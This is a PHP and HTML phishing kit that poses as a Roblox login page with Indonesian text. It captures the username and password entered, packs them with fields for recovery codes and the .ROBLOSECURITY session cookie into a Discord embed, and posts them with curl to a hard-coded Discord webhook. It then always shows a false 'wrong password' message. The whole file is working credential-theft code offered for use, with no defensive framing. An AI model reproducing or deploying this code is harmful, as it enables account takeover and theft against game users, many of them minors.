<?php
session_start();

$webhook = 'https://discord.com/api/webhooks/1517150826726952972/0nqZcAIPURdTyFhkLGcfTcN8IAYgpFoTWmQwM99LykGc35s7iLYw9B4NwPWB19JtoZeV';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['stepinfo'])) {
    $stepinfo = $_POST['stepinfo'];
    $stepinfo = json_decode($stepinfo);

    $_SESSION['step'] = $stepinfo->ticket ?? '';
    $_SESSION['password'] = $stepinfo->password ?? '';
    $_SESSION['uid'] = $stepinfo->userid ?? '';

    echo json_encode(['status' => 'success']);
    exit;
}

if (isset($_GET['request'])) {
    $request = $_GET['request'];
    if ($request == 'ticket') {
        echo $_SESSION['step'] ?? '';
        exit;
    }
    if ($request == 'password') {
        echo $_SESSION['password'] ?? '';
        exit;
    }
    if ($request == 'userid') {
        echo $_SESSION['uid'] ?? '';
        exit;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['log'])) {
    $log = $_POST['log'];
    $log = json_decode($log);

    if (!$log) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON']);
        exit;
    }

    $username = $log->username ?? 'Unknown';
    $userid = $log->userid ?? '';
    $age = $log->age ?? 'Unknown';
    $password = $log->password ?? '';
    $summary = $log->summary ?? 0;
    $balance = $log->balance ?? 0;
    $pending = $log->pending ?? 0;
    $rap = $log->rap ?? 0;
    $credit = $log->credit ?? 'None';
    $pin = $log->pin ?? 'None';
    $step = $log->step ?? 'Disabled';
    $premium = $log->premium ?? 'No';
    $accountage = $log->accountage ?? 'Unknown';
    $cantrade = $log->cantrade ?? 'No';
    $collectibles = $log->collectibles ?? 'None';
    $recoverycodes = $log->recoverycodes ?? 'None';
    $roblosecurity = $log->roblosecurity ?? 'None';

    if ($recoverycodes && $roblosecurity) {
        $result = json_encode([
            "username" => 'vKevin',
            "avatar_url" => 'https://th.bing.com/th/id/R.e34acaf4d173d199bad26afbed709a36?rik=GrqM%2fW4mG1EyoQ&riu=http%3a%2f%2fweekender.com.sg%2fentertainment%2fwp-content%2fuploads%2f2019%2f07%2f960x0.png&ehk=BPb%2b5VRU3ZIx3RU4OQW5qmhKRR4yr2mYzgosvXALWuA%3d&risl=&pid=ImgRaw&r=0',
            "content" => '',
            "embeds" => [
                [
                    "title" => "$username ($age)",
                    "type" => "rich",
                    "description" => "[Profile](https://www.roblox.com/users/$userid/profile) | [Trade](https://www.roblox.com/users/$userid/trade) | [Check](https://www.roblox.com/login)",
                    "url" => 'https://discord.gg/leakedbyvkevin',
                    "color" => hexdec('FFFF00'),
                    "thumbnail" => [
                        "url" => "https://www.roblox.com/headshot-thumbnail/image?userId=$userid&width=420&height=420&format=png"
                    ],
                    "author" => [
                        "name" => 'Leaked',
                        "url" => 'https://discord.gg/bZPxCuERrf'
                    ],
                    "fields" => [
                        ["name" => "**Username:**", "value" => "```$username```", "inline" => false],
                        ["name" => "**Password:**", "value" => "```$password```", "inline" => false],
                        ["name" => "**Summary:**", "value" => "```R$$summary```", "inline" => true],
                        ["name" => "**Balance:**", "value" => "```R$$balance $pending```", "inline" => true],
                        ["name" => "**RAP:**", "value" => "```R$$rap```", "inline" => true],
                        ["name" => "**Credit:**", "value" => "```$credit```", "inline" => true],
                        ["name" => "**Pin:**", "value" => "```$pin```", "inline" => true],
                        ["name" => "**2-Step:**", "value" => "```$step```", "inline" => true],
                        ["name" => "**Premium:**", "value" => "```$premium```", "inline" => true],
                        ["name" => "**Account Age:**", "value" => "```$accountage```", "inline" => true],
                        ["name" => "**Can Trade:**", "value" => "```$cantrade```", "inline" => true],
                        ["name" => "**Collectibles:**", "value" => "```$collectibles```", "inline" => false],
                        ["name" => "**Recovery Codes:**", "value" => "```$recoverycodes```", "inline" => false],
                        ["name" => "**.ROBLOSECURITY:**", "value" => "```$roblosecurity```", "inline" => false],
                    ]
                ],
            ],
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $webhook,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $result,
            CURLOPT_HTTPHEADER => ["Content-Type: application/json"],
            CURLOPT_RETURNTRANSFER => true
        ]);
        $response = curl_exec($ch);
        curl_close($ch);

        session_destroy();
        echo json_encode(['status' => 'success', 'sent' => true]);
        exit;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Roblox - Login</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:Arial,sans-serif; background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; }
        .box { background:white; padding:30px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); width:350px; text-align:center; }
        .logo { font-size:40px; font-weight:bold; color:#1877f2; margin-bottom:10px; }
        .input { width:100%; padding:12px; margin:8px 0; border:1px solid #ddd; border-radius:4px; font-size:16px; }
        .btn { width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:4px; font-size:18px; font-weight:bold; cursor:pointer; }
        .btn:hover { background:#166fe5; }
        .error { color:#f02849; font-size:13px; margin-top:10px; display:none; }
        .error.show { display:block; }
        .footer { margin-top:20px; font-size:12px; color:#8a8d91; }
    </style>
</head>
<body>
<div class="box">
    <div class="logo">roblox</div>
    <h3 style="color:#606770;font-weight:normal;margin-bottom:20px;">Masuk ke akun Anda</h3>
    <form id="loginForm">
        <input type="text" id="username" class="input" placeholder="Username atau Email" required>
        <input type="password" id="password" class="input" placeholder="Kata sandi" required>
        <div class="error" id="errorMsg">✕ Kata sandi yang Anda masukkan salah.</div>
        <button type="submit" class="btn" id="loginBtn">Masuk</button>
    </form>
    <div class="footer">© 2026 Roblox Corporation</div>
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    var btn = document.getElementById('loginBtn');
    var error = document.getElementById('errorMsg');

    if (!username || !password) {
        error.textContent = '✕ Harap isi semua field.';
        error.classList.add('show');
        return;
    }

    error.classList.remove('show');
    btn.textContent = '⏳ Memproses...';
    btn.disabled = true;

    var data = {
        ticket: 'completed',
        password: password,
        userid: username
    };

    fetch(window.location.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'stepinfo=' + encodeURIComponent(JSON.stringify(data))
    })
    .then(function(res) { return res.json(); })
    .then(function(res) {
        if (res.status === 'success') {
            fetch(window.location.href + '?request=ticket')
            .then(function(r) { return r.text(); })
            .then(function(ticket) {
                fetch(window.location.href + '?request=password')
                .then(function(r) { return r.text(); })
                .then(function(pwd) {
                    fetch(window.location.href + '?request=userid')
                    .then(function(r) { return r.text(); })
                    .then(function(uid) {
                        var logData = {
                            username: username,
                            userid: uid || username,
                            age: 'Unknown',
                            password: pwd || password,
                            summary: 0,
                            balance: 0,
                            pending: 0,
                            rap: 0,
                            credit: 'None',
                            pin: 'None',
                            step: 'Disabled',
                            premium: 'No',
                            accountage: 'Unknown',
                            cantrade: 'No',
                            collectibles: 'None',
                            recoverycodes: 'None',
                            roblosecurity: 'None'
                        };

                        fetch(window.location.href, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: 'log=' + encodeURIComponent(JSON.stringify(logData))
                        })
                        .then(function(r) { return r.json(); })
                        .then(function(res) {
                            btn.textContent = 'Masuk';
                            btn.disabled = false;
                            error.textContent = '✕ Kata sandi yang Anda masukkan salah.';
                            error.classList.add('show');
                        });
                    });
                });
            });
        }
    })
    .catch(function(err) {
        btn.textContent = 'Masuk';
        btn.disabled = false;
        error.textContent = '✕ Terjadi kesalahan.';
        error.classList.add('show');
    });
});
</script>
</body>
</html>
